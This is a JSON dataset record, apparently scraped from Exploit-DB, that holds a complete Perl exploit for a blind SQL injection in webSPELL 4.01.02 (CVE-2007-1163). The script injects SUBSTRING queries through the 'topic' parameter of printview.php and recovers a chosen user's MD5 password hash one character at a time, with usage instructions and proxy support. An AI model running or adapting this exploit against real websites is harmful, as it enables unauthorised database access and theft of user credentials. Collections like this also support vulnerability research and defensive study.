{
  "id": "3351",
  "title": "webSPELL 4.01.02 - &#039;topic&#039; SQL Injection",
  "cve": "CVE-2007-1163",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse LWP::UserAgent;\r\nuse Getopt::Long;\r\n\r\nif(!$ARGV[2])\r\n{\r\n  print \"\\n                           \\\\#'#/                       \";\r\n  print \"\\n                           (-.-)                        \";\r\n  print \"\\n   -------------------oOO---(_)---OOo-------------------\";\r\n  print \"\\n   | webSPELL <= v4.01.02 (topic) Remote SQL Injection |\";\r\n  print \"\\n   |                   coded by DNX                    |\";\r\n  print \"\\n   -----------------------------------------------------\";\r\n  print \"\\n[!] Bug: in printview.php line 61, inject sql code in \\$topic\";\r\n  print \"\\n[!] Solution: install security fix\";\r\n  print \"\\n[!] Usage: perl ws.pl [Host] [Path] [Topic] <Options>\";\r\n  print \"\\n[!] Example: perl ws.pl 127.0.0.1 /webspell/ -tid 1 -uid 2 -t my_user\";\r\n  print \"\\n[!] Options:\";\r\n  print \"\\n       -tid [no]     Valid topic-ID\";\r\n  print \"\\n       -uid [no]     User-ID, default is 1\";\r\n  print \"\\n       -t [name]     Changed the user table name, default is webs_user\";\r\n  print \"\\n       -p [ip:port]  Proxy support\";\r\n  print \"\\n\";\r\n  exit;\r\n}\r\n\r\nmy $host    = $ARGV[0];\r\nmy $path    = $ARGV[1];\r\nmy $user    = 1;\r\nmy $table   = \"webs_user\";\r\nmy $topic   = 0;\r\nmy %options = ();\r\nGetOptions(\\%options, \"tid=i\", \"uid=i\", \"t=s\", \"p=s\");\r\n\r\nprint \"[!] Exploiting...\\n\";\r\n\r\nif($options{\"tid\"})\r\n{\r\n  $topic = $options{\"tid\"};\r\n}\r\nelse\r\n{\r\n  print \"[!] Exploit failed, missing parameter\\n\";\r\n  exit;\r\n}\r\n\r\nif($options{\"uid\"})\r\n{\r\n  $user = $options{\"uid\"};\r\n}\r\n\r\nif($options{\"t\"})\r\n{\r\n  $table = $options{\"t\"};\r\n}\r\n\r\nsyswrite(STDOUT, \"[!] MD5-Hash: \", 14);\r\n\r\nfor(my $i = 1; $i <= 32; $i++)\r\n{\r\n  my $found = 0;\r\n  my $h = 48;\r\n  while(!$found && $h <= 57)\r\n  {\r\n    if(istrue3($host, $path, $table, $topic, $user, $i, $h))\r\n    {\r\n      $found = 1;\r\n      syswrite(STDOUT, chr($h), 1);\r\n    }\r\n    $h++;\r\n  }\r\n  if(!$found)\r\n  {\r\n    $h = 97;\r\n    while(!$found && $h <= 122)\r\n    {\r\n      if(istrue3($host, $path, $table, $topic, $user, $i, $h))\r\n      {\r\n        $found = 1;\r\n        syswrite(STDOUT, chr($h), 1);\r\n      }\r\n      $h++;\r\n    }\r\n  }\r\n}\r\n\r\nprint \"\\n[!] Exploit done\\n\";\r\n\r\nsub istrue3\r\n{\r\n  my $host  = shift;\r\n  my $path  = shift;\r\n  my $table = shift;\r\n  my $tid   = shift;\r\n  my $uid   = shift;\r\n  my $i     = shift;\r\n  my $h     = shift;\r\n  \r\n  my $ua = LWP::UserAgent->new;\r\n  my $url = \"http://\".$host.$path.\"printview.php?board=1&topic=\".$tid.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n  \r\n  if($options{\"p\"})\r\n  {\r\n    $ua->proxy('http', \"http://\".$options{\"p\"});\r\n  }\r\n  \r\n  my $response = $ua->get($url);\r\n  my $content = $response->content;\r\n  my $regexp = \"<b>Main Board</b>\";\r\n  \r\n  if($content =~ /$regexp/)\r\n  {\r\n    return 1;\r\n  }\r\n  else\r\n  {\r\n    return 0;\r\n  }\r\n}\r\n\r\n# milw0rm.com [2007-02-21]",
  "url": "https://www.exploit-db.com/exploits/3351"
}